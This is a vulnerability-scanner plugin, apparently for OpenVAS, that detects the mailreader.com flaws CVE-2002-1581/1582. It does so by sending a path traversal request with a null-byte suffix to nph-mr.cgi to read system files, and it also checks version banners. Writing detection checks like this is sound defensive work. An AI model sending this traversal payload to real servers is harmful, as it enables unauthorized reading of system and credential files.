# Copyright (C) 2005 Michel Arboi
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11780");
  script_version("2020-08-24T15:18:35+0000");
  script_tag(name:"last_modification", value:"2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2002-1581", "CVE-2002-1582");
  script_bugtraq_id(5393, 6055, 6058);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("mailreader.com directory traversal and arbitrary command execution");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2005 Michel Arboi");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Upgrade to v2.3.32 or later.");

  script_tag(name:"summary", value:"mailreader.com software is installed. A directory traversal flaw
  allows anybody to read arbitrary files on your system.");

  script_tag(name:"qod_type", value:"remote_banner");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("misc_func.inc");

port = http_get_port(default:80);

foreach dir( make_list_unique( "/", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" )
    dir = "";

  req = http_get(item: dir + "/nph-mr.cgi?do=loginhelp&configLanguage=english", port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if(!res || "Powered by Mailreader.com" >!< res)
    continue;

  files = traversal_files();
  foreach pattern(keys(files)) {

    file = files[pattern];

    url = strcat(dir, "/nph-mr.cgi?do=loginhelp&configLanguage=../../../../../../../" + file + "%00");
    r = http_get(port: port, item: url);
    r2 = http_keepalive_send_recv(port: port, data: r);
    if(!r2)
      continue;

    if (egrep(string: r2, pattern: pattern)) {
      report = http_report_vuln_url(url: url);
      security_message(data: report, port: port);
      exit(0);
    }
  }

  if (res =~ "Powered by Mailreader.com v2\.3\.3[01]" || res =~ "Powered by Mailreader.com v2\.([01]\.*|2\.([0-2]\..*|3\.([0-9][^0-9]|[12][0-9])))") {
    security_message(port: port);
    exit(0);
  }
}

exit(99);
